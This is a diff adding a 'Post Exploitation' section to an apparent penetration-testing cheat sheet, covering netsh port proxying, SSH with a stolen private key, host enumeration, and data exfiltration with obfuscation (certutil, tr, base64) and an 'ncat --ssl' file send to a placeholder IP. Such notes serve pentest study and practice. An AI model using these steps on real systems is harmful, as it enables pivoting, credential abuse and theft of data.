@@ -437,9 +437,95 @@ use script with msfvenom payload
 
 
 
+# Post Exploitation: 
+
+
+## Windows Targets Port Proxying:
+
+	netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
+	netsh interface portproxy show all
+	netsh interface portproxy delete v4tov4 listenport=<LocalPort>
+	netsh interface portproxy reset
+
+
+## Using Stolen Private Key:
+-i to specify private key.
+
+		chmod 600 /home/user/stolenkey
+  		
+		ssh -i /home/user/stolenkey jane@10.20.30.40
+
+
+## Host Enumeration:
+
+User Enumeration:
+
+  		Windows:
+		net user
+
+  		Linux
+    		cat /etc/passwd
+Process Enumeration:
+
+	
+		Windows:
+		tasklist /v
+		
+		Linux:
+		ps -elf
+Service Enumeration:
+
+	Windows:
+	tasklist /svc
+	
+	Linux:
+	chkconfig                   # SysV
+	systemctl --type=service    # SystemD
+ 	systemctl --type=service --state=active | grep running
+
+ Network Connection Enumeration:
+ 
+	
+	Windows:
+	ipconfig /all
+	
+	Linux:
+	ifconfig -a      # SysV (deprecated)
+	ip a             # SystemD
+
+
+Data Exfiltration
+Session Transcript
+
+ 	ssh <user>@<host> | tee
+
+Obfuscation (Windows)
+
+	type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
+	certutil -encode <file> encoded.b64
+
+Obfuscation (Linux)
+
+	cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+	cat <file>> | base64
+
+Encrypted Transport
+
+	scp <source> <destination>
+	ncat --ssl <ip> <port> < <file
 
 
 
+Inspect Linux Files /etc/hosts && /etc/crontab
+
+### General commands:
+
+Windows:
+
+dir /ah
+find "string" <file>    ( /i is case insensitive )
+type <file> 	(Equivilant of Cat in liux)
+tasklist /svc | findstr "<pid #>"
 
 
   
